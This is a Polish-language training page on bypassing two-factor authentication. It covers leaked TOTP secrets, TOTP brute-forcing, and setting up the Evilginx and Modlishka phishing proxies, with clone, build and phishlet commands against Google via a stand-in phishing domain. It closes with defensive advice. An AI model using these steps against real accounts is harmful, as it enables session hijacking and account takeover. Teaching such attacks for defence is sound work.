---
id: "2fa-bypass"
title: "🔓 Ataki na uwierzytelnianie wieloskładnikowe (2FA Bypass)"
sidebar_position: 15
---

# 🔓 Ataki na uwierzytelnianie wieloskładnikowe (2FA Bypass)

Uwierzytelnianie wieloskładnikowe (2FA) ma na celu zwiększenie bezpieczeństwa użytkownika poprzez dodatkowy etap weryfikacji, np. kod SMS, aplikację TOTP (Time-Based One-Time Password) lub klucz U2F. Jednak różne implementacje 2FA mogą być podatne na obejście.

---

## 🎭 Ataki na TOTP (Time-Based One-Time Password)
TOTP to metoda, w której kody generowane są na podstawie zegara systemowego i tajnego klucza. Jeśli atakujący przejmie ten klucz, może generować poprawne kody 2FA.

### **1️⃣ Kradzież tajnego klucza TOTP**
Niektóre aplikacje mogą wyciekać sekretny klucz TOTP, np. poprzez:
- **Niezabezpieczone API** – wyciek klucza podczas rejestracji 2FA
- **Słabe zabezpieczenia aplikacji mobilnych** – ekstrakcja z aplikacji przez inżynierię wsteczną
- **Złamanie backupów konfiguracji** – klucz może być zapisany w bazie danych użytkownika

#### **1.1 Odczytanie klucza TOTP z API**
Jeśli aplikacja zwraca tajny klucz przez API, można go przechwycić w Burp Suite:
```http
GET /api/2fa/setup
Response: {"secret": "JBSWY3DPEHPK3PXP"}
```
Następnie klucz można wprowadzić do aplikacji Google Authenticator, aby generować poprawne kody.

#### **1.2 Atak bruteforce na TOTP**
TOTP generuje kody co 30 sekund, co daje atakującemu ograniczoną liczbę możliwych wartości (np. 1 000 000 kodów dla 6 cyfr). Niektóre aplikacje nie blokują zbyt wielu prób.
```bash
python totp_bruteforce.py --target example.com --user admin
```
Rozwiązanie: **Blokada po kilku nieudanych próbach oraz wykrywanie podejrzanych logowań**.

---

## 🎣 Bypass przy użyciu phishingu
Phishing to jedna z najczęściej wykorzystywanych metod do obejścia 2FA.

### **2️⃣ Atak na 2FA za pomocą narzędzia Evilginx**
Evilginx to narzędzie proxy MITM, które pozwala na przechwycenie kodów 2FA oraz sesji użytkownika.

#### **2.1 Konfiguracja ataku**
1. Uruchomienie Evilginx:
```bash
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2 && make install
```
2. Konfiguracja hosta phishingowego:
```bash
config domain phishing.example.com
```  
3. Uruchomienie ataku na Google:
```bash
phishlets enable google
phishlets hostname google phishing.example.com
```  
4. Atakujący wysyła ofierze link phishingowy.
5. Po zalogowaniu użytkownika Evilginx przechwytuje sesję i kod 2FA.

#### **2.2 Atak na 2FA za pomocą narzędzia Modlishka**
Alternatywnym narzędziem do przechwycenia 2FA jest **Modlishka**:
```bash
git clone https://github.com/drk1wi/Modlishka.git
cd Modlishka && go build
./Modlishka -config config.json
```
Użytkownik myśli, że loguje się do prawdziwej strony, ale Modlishka przechwytuje jego dane i kody 2FA.

---

## 🔐 Jak zabezpieczyć się przed 2FA Bypass?
✅ **Używaj kluczy U2F/FIDO zamiast TOTP** – nie można ich przechwycić przez phishing.
✅ **Wykrywaj anomalie logowania** – analiza geolokalizacji i nowych urządzeń.
✅ **Blokuj logowanie na nowych urządzeniach bez dodatkowej weryfikacji**.
✅ **Monitoruj ruch DNS i adresy URL** – wykrywanie fałszywych domen.
✅ **Edukacja użytkowników o zagrożeniach phishingowych**.

---

Ataki na 2FA są coraz częstsze i mogą prowadzić do przejęcia kont nawet w dobrze zabezpieczonych systemach. Kolejnym krokiem będzie analiza podatności **Ataki na API i WebSockets**! 🚀
